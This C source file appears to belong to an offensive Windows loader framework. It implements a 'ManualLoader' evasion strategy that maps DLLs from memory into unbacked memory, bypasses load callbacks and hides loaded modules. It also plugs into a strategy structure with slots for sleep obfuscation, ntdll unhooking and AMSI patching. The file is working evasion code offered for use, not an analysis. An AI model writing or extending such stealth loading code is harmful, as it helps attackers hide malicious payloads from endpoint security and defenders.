#include "../include/common_defines.h"
#include "../include/strategy.h"
#include "../include/manual_loader.h"
#include "../include/rtldr_ctx.h"
#include "../include/syscalls.h"
#include "../include/mem.h"

// Manual loading strategy private data
typedef struct _MANUAL_LOAD_DATA {
    MANUAL_LOAD_STRATEGY strategy;
    MANUAL_LOAD_CONTEXT load_context;
    PVOID loaded_modules[16]; // Track up to 16 loaded modules
    ULONG module_count;
} MANUAL_LOAD_DATA, *PMANUAL_LOAD_DATA;

// Forward declarations
static BOOL ManualLoad_Initialize(PRTLDR_CTX ctx);
static BOOL ManualLoad_LoadLibrary(PRTLDR_CTX ctx, PVOID buffer, ULONG flags);
static BOOL ManualLoad_Cleanup(PRTLDR_CTX ctx);

// Manual loading strategy implementation
static BOOL ManualLoad_Initialize(PRTLDR_CTX ctx) {
    PMANUAL_LOAD_DATA manual_data = NULL;
    
    if (!ctx) {
        return FALSE;
    }
    
    // Allocate strategy data
    manual_data = (PMANUAL_LOAD_DATA)ctx->mem_alloc(sizeof(MANUAL_LOAD_DATA));
    if (!manual_data) {
        return FALSE;
    }
    
    // Zero out data
    for (SIZE_T i = 0; i < sizeof(MANUAL_LOAD_DATA); i++) {
        ((BYTE*)manual_data)[i] = 0;
    }
    
    // Initialize strategy
    manual_data->strategy.szStrategyName = "ManualLoader";
    manual_data->strategy.dwVersion = 1;
    manual_data->strategy.pfnManualLoadLibrary = ManualLoadLibrary;
    manual_data->strategy.pfnManualUnloadLibrary = ManualUnloadLibrary;
    manual_data->strategy.pfnManualGetProcAddress = ManualGetProcAddress;
    manual_data->strategy.pfnBypassLoadCallbacks = AllocateUnbackedMemory;
    
    // Store in context
    ctx->strategy_data = manual_data;
    
    return TRUE;
}

static BOOL ManualLoad_LoadLibrary(PRTLDR_CTX ctx, PVOID buffer, ULONG flags) {
    PMANUAL_LOAD_DATA manual_data = NULL;
    NTSTATUS status;
    PVOID loaded_module = NULL;
    
    if (!ctx || !buffer) {
        return FALSE;
    }
    
    manual_data = (PMANUAL_LOAD_DATA)ctx->strategy_data;
    if (!manual_data) {
        return FALSE;
    }
    
    // Check if we have space for more modules
    if (manual_data->module_count >= 16) {
        return FALSE;
    }
    
    // Load the library manually
    status = ManualLoadLibrary(ctx, buffer, &loaded_module, flags);
    if (!NT_SUCCESS(status) || !loaded_module) {
        return FALSE;
    }
    
    // Track the loaded module
    manual_data->loaded_modules[manual_data->module_count] = loaded_module;
    manual_data->module_count++;
    
    return TRUE;
}

static BOOL ManualLoad_Cleanup(PRTLDR_CTX ctx) {
    PMANUAL_LOAD_DATA manual_data = NULL;
    
    if (!ctx) {
        return FALSE;
    }
    
    manual_data = (PMANUAL_LOAD_DATA)ctx->strategy_data;
    if (!manual_data) {
        return TRUE; // Nothing to cleanup
    }
    
    // Unload all tracked modules
    for (ULONG i = 0; i < manual_data->module_count; i++) {
        if (manual_data->loaded_modules[i]) {
            ManualUnloadLibrary(ctx, manual_data->loaded_modules[i]);
            manual_data->loaded_modules[i] = NULL;
        }
    }
    
    // Free strategy data
    if (ctx->mem_free) {
        ctx->mem_free(manual_data);
    }
    ctx->strategy_data = NULL;
    
    return TRUE;
}

// Manual loading strategy loader
BOOL Strategy_LoadManualLoader(PEVASION_STRATEGY pStrategy) {
    if (!pStrategy) {
        return FALSE;
    }
    
    // Set strategy metadata
    pStrategy->szStrategyName = "ManualLoader";
    pStrategy->dwVersion = 1;
    
    // Set function pointers
    pStrategy->pfnInitialize = ManualLoad_Initialize;
    pStrategy->pfnCleanup = ManualLoad_Cleanup;
    
    // Manual loader doesn't use standard evasion functions
    pStrategy->pfnObfuscateSleep = NULL;
    pStrategy->pfnUnhookNtdll = NULL;
    pStrategy->pfnPatchAMSI = NULL;
    
    return TRUE;
}

// Utility function to load DLL with stealth features
BOOL ManualLoad_LoadDllWithStealth(PRTLDR_CTX ctx, PVOID dll_buffer, SIZE_T dll_size) {
    ULONG flags = MANUAL_LOAD_UNBACKED_MEMORY | MANUAL_LOAD_BYPASS_CALLBACKS | MANUAL_LOAD_HIDE_MODULE;
    
    return ManualLoad_LoadLibrary(ctx, dll_buffer, flags);
}

// Test function to demonstrate manual loading capabilities
BOOL ManualLoad_TestLoad(PRTLDR_CTX ctx) {
    // This is a test placeholder - in real usage, you would provide actual DLL data
    // For demonstration, we'll just test with a minimal PE header
    
    BYTE test_pe_header[] = {
        0x4D, 0x5A, 0x90, 0x00,  // DOS signature
        // ... minimal PE structure for testing
    };
    
    return ManualLoad_LoadLibrary(ctx, test_pe_header, MANUAL_LOAD_FROM_MEMORY | MANUAL_LOAD_NO_ENTRY);
} 